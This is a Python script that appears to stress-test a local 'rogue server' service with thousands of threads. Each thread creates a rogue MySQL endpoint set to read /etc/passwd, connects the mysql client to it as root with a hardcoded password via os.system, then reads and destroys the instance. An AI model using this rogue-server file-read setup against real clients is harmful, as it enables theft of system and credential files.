import time
import threading
import random
import hashlib
import requests
import json
import os


def run():
    r = random.randint(1, 20)
    time.sleep(r)


    #generate random serverCode
    t = time.time()
    timestamp = str(int(round(t * 1000000)))

    r = str(random.randint(0, 20000))
    m = hashlib.md5()
    m.update(r.encode("utf-8"))
    hash = m.hexdigest()

    serverCode = "servercode-" + hash + "-" + timestamp
    randomString = hash

    #Step 1
    #ini rogue server
    url = "http://127.0.0.1:1921/ebf734024jto485" + "/instantiate/" + serverCode + "/" + randomString + "?x=/etc/passwd"
    res = requests.get(url=url)
    res = json.loads(res.text)

    port = res['msg']

    #Step 2
    #read file
    f = open("test/" + serverCode + ".mysql","w")
    f.write("delete from xxx where x='" + serverCode + randomString + "';")
    f.close()
    time.sleep(1)
    sql = "mysql -h 127.0.0.1 -P " + str(port) + " -u root -p123456 -D xxx < test/" + serverCode + ".mysql"
    print(sql)
    os.system(sql)


    #Step 3
    #read file
    url = "http://127.0.0.1:1921/ebf734024jto485" + "/readInfo/" + serverCode + "/" + randomString + "?x=/etc/passwd"
    res = requests.get(url=url)
    res = json.loads(res.text)

    #Step 4
    #destroy
    url = "http://127.0.0.1:1921/ebf734024jto485" + "/destroy/" + serverCode + "/" + randomString + "?x=/etc/passwd"
    res = requests.get(url=url)
    res = json.loads(res.text)

try:
    for i in range(1,4000):
        threading.Thread(target=run).start()
except:
    pass